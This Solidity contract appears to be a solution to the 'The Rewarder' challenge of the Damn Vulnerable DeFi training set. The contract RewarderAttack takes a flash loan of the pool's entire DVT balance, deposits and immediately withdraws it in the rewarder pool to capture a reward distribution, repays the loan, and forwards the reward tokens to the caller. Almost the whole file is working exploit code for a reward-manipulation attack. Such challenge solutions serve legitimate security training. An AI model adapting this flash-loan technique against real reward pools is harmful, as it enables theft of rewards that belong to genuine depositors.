// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {DamnValuableToken} from "src/Contracts/DamnValuableToken.sol";
import {RewardToken} from "src/Contracts/the-rewarder/RewardToken.sol";

interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

interface IFlashLoanPool {
    function flashLoan(uint256 amount) external;
}

contract RewarderAttack {
    IRewarderPool public immutable rewarderPool;
    IFlashLoanPool public immutable flashLoanPool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;

    constructor(address _rewarderPool, address _flashLoan, address _liquidityToken, address _rewardToken) {
        rewarderPool = IRewarderPool(_rewarderPool);
        flashLoanPool = IFlashLoanPool(_flashLoan);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
    }

    function attack() external {
        // get the balance of DVT in FlashLoanerPool contract
        uint256 flashLoanBalance = liquidityToken.balanceOf(address(flashLoanPool));
        // approve amount of flashLoanBalance of DVT tokenes for rewarderPool.deposit()
        liquidityToken.approve(address(rewarderPool), flashLoanBalance);
        // get the flash loan with all possible DVT available
        flashLoanPool.flashLoan(flashLoanBalance);

        // transfer the reward tokens to the attacker
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    // called by flashLoanPool.flashLoan()
    function receiveFlashLoan(uint256 amount) external {
        // deposit DVT tokens into TheRewarderPool contract
        rewarderPool.deposit(amount);
        // withdraw DVT tokens from TheRewarderPool contract
        rewarderPool.withdraw(amount);

        // repay the flash loan
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}
